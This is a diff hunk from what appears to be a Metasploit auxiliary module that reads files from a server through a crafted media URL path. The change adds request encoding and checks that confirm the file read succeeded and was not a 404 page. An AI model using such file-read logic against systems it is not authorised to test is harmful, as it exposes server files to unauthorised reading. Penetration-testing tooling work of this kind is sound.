@@ -120,8 +120,14 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => "#{datastore['MEDIA_URL']}//#{datastore['FILEPATH']}",
+      'encode' => true,
       'headers' => { 'Accept' => 'text/html' }
     })
+    fail_with(Failure::Unreachable, 'The asset probe did not respond; the exported file could not be verified') unless res
+
+    if res.code == 404 && res.body.blank?
+      fail_with(Failure::UnexpectedReply, 'The asset probe returned an empty HTTP 404 response; the exported file could not be verified')
+    end
     if exported_not_found?(extracted_content, res)
       fail_with(Failure::NotFound, 'The exported file matches the server HTTP 404 response; the file read was not confirmed')
     end
